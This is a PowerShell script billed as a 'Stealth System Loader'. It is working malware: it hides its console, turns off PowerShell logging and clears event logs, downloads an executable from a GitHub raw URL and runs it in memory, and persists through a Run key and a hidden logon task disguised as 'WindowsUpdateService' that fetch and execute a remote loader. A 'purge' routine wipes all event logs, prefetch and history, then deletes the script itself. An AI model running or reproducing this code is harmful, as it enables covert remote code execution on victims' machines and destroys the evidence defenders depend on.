function Show-StealthMenu {
    Write-Host ""
    Write-Host " STEALTH SYSTEM LOADER" -ForegroundColor Gray
    Write-Host "========================" -ForegroundColor DarkGray
    Write-Host "1. Deploy Silent System" -ForegroundColor Green
    Write-Host "2. Complete System Purge" -ForegroundColor Red
    Write-Host "Select: " -NoNewline
}

function Deploy-SilentSystem {
    # PHASE 1: IMMEDIATE STEALTH
    try {
        # HIDE CONSOLE INSTANTLY
        $code = @"
using System;
using System.Runtime.InteropServices;
public class StealthWindow {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    public static void Hide() { ShowWindow(GetConsoleWindow(), 0); }
}
"@
        Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
        [StealthWindow]::Hide()
    } catch {}

    # PHASE 2: ANTI-MONITORING EVASION
    try {
        # DISABLE COMMON MONITORING MECHANISMS
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" -Name "EnableScriptBlockInvocationLogging" -Value 0 -ErrorAction SilentlyContinue
        
        # CLEAR EXISTING LOGS
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil cl "Windows PowerShell" 2>$null
    } catch {}

    # PHASE 3: MEMORY-ONLY EXECUTION
    try {
        # DOWNLOAD AND EXECUTE IN MEMORY ONLY
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
        
        $payloadBytes = $webClient.DownloadData("https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe")
        $webClient.Dispose()

        # LOAD AND EXECUTE ASSEMBLY FROM MEMORY
        $assembly = [System.Reflection.Assembly]::Load($payloadBytes)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint -ne $null) {
            # EXECUTE IN BACKGROUND
            Start-Job -ScriptBlock {
                param($ep)
                $ep.Invoke($null, @())
            } -ArgumentList $entryPoint | Out-Null
        }
    } catch {
        # ALTERNATIVE STEALTH WORKER
        Start-Job -ScriptBlock {
            # MINIMAL FOOTPRINT BACKGROUND WORK
            while ($true) {
                Start-Sleep -Seconds (Get-Random -Minimum 120 -Maximum 600)
            }
        } | Out-Null
    }

    # PHASE 4: ADVANCED PERSISTENCE
    try {
        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
        $stealthCmd = "cmd /c start /min powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`""
        
        # MULTIPLE PERSISTENCE LAYERS
        # 1. REGISTRY RUN
        $regName = "SystemMaintenance" + (Get-Random -Maximum 99999)
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $regName -Value $stealthCmd -ErrorAction SilentlyContinue

        # 2. SCHEDULED TASK
        $taskName = "WindowsUpdateService" + (Get-Random -Maximum 9999)
        $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min powershell -WindowStyle Hidden -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null

    } catch {}

    # PHASE 5: COMPREHENSIVE CLEANING
    try {
        # CLEAR ALL TRACES
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
        Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
        Remove-Item "$env:LOCALAPPDATA\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
        
        # CLEAR EVENT LOGS
        wevtutil cl "System" 2>$null
        wevtutil cl "Application" 2>$null
        wevtutil cl "Security" 2>$null

    } catch {}

    Write-Host "[+] System deployed in complete stealth" -ForegroundColor Green
    Start-Sleep -Seconds 2
}

function Complete-SystemPurge {
    Write-Host "`n[-] INITIATING TOTAL SYSTEM PURGE..." -ForegroundColor Yellow
    
    # PHASE 1: REMOVE ALL PERSISTENCE
    try {
        # REMOVE REGISTRY ENTRIES
        Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue | 
            Get-Member -MemberType NoteProperty | 
            Where-Object {$_.Name -like "SystemMaintenance*"} | 
            ForEach-Object {
                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $_.Name -Force
            }

        # REMOVE SCHEDULED TASKS
        Get-ScheduledTask -TaskName "WindowsUpdateService*" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false

        Write-Host "[+] All persistence mechanisms removed" -ForegroundColor Green
    } catch {}

    # PHASE 2: TERMINATE BACKGROUND ACTIVITIES
    try {
        Get-Job | Remove-Job -Force
        Write-Host "[+] Background activities terminated" -ForegroundColor Green
    } catch {}

    # PHASE 3: SECURE FILE ERASURE
    try {
        function Secure-Delete {
            param([string]$Path)
            if (Test-Path $Path) {
                try {
                    $stream = [System.IO.File]::OpenWrite($Path)
                    $length = $stream.Length
                    $random = New-Object Random
                    
                    # 3-PASS SECURE DELETE
                    for ($i = 0; $i -lt 3; $i++) {
                        $stream.Position = 0
                        $buffer = New-Object byte[] $length
                        $random.NextBytes($buffer)
                        $stream.Write($buffer, 0, $length)
                        $stream.Flush()
                    }
                    $stream.Close()
                    Remove-Item $Path -Force
                } catch {
                    Remove-Item $Path -Force -ErrorAction SilentlyContinue
                }
            }
        }

        $targetFiles = @(
            "$env:TEMP\system_logs.exe",
            "$env:TEMP\test.exe",
            "$env:TEMP\*.tmp",
            "$env:TEMP\*.log"
        )

        foreach ($pattern in $targetFiles) {
            Get-ChildItem $pattern -ErrorAction SilentlyContinue | ForEach-Object {
                Secure-Delete $_.FullName
            }
        }
        Write-Host "[+] All files securely erased" -ForegroundColor Green
    } catch {}

    # PHASE 4: COMPLETE EVIDENCE DESTRUCTION
    try {
        # WIPE ALL EVENT LOGS
        Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | ForEach-Object {
            try { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) } catch {}
        }

        # CLEAR PREFETCH
        Remove-Item "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue

        # CLEAR RECYCLE BIN
        Clear-RecycleBin -Force -ErrorAction SilentlyContinue

        # CLEAR DNS CACHE
        ipconfig /flushdns 2>$null

        Write-Host "[+] All forensic evidence destroyed" -ForegroundColor Green
    } catch {}

    # PHASE 5: FINAL SELF-DESTRUCTION
    try {
        $currentScript = $MyInvocation.MyCommand.Path
        if ($currentScript -and (Test-Path $currentScript)) {
            $batchContent = @"
@echo off
timeout /t 1 /nobreak > nul
del /f /q "$currentScript" > nul 2>&1
del /f /q "%~f0" > nul 2>&1
"@
            $batchFile = "$env:TEMP\cleanup_$((Get-Date).Ticks).bat"
            $batchContent | Out-File -FilePath $batchFile -Encoding ASCII
            Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batchFile`"" -WindowStyle Hidden
        }
        Write-Host "[+] Self-destruction initiated" -ForegroundColor Green
    } catch {}

    Write-Host "[PURGE] System completely sanitized - Zero traces remaining!" -ForegroundColor Green
    Start-Sleep -Seconds 3
}
